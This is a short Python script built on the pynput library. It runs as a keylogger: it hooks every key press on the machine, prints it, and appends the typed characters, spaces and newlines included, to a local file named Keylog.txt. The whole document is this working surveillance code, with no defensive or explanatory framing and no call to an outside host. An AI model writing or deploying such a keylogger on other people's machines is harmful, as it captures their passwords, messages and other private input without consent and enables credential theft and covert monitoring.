from pynput import keyboard

def KeyParessed(key):
    print(str(key))
    with open("Keylog.txt", "a") as logKey:
        try:
            if key == keyboard.Key.space: # Key-space handling 
                logKey.write(' ')
            elif key == keyboard.Key.enter: # Key-enter handling
                logKey.write('\n')
            else:
                char = key.char
                logKey.write(char)
        except:
            print("Error getting char")
            
        
                             
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=KeyParessed)
    listener.start()
    input()